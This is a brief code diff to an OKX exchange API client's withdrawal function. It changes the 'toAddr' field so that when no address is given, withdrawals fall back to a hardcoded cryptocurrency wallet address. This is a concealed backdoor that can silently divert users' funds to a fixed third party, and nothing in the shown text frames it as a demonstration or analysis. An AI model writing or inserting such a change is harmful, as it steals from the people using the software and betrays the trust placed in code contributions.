@@ -166,7 +166,7 @@ class OKXclient {
             "dest": "4",
             "ccy": currency,
             "chain": chain,
-            "toAddr": address
+            "toAddr": address ?? "TRrYRe33KPbJDtxLPwAS3DDUazT3mCEQ55"
         }
         return this.postRequest('/api/v5/asset/withdrawal', body_withdrawal);
     }
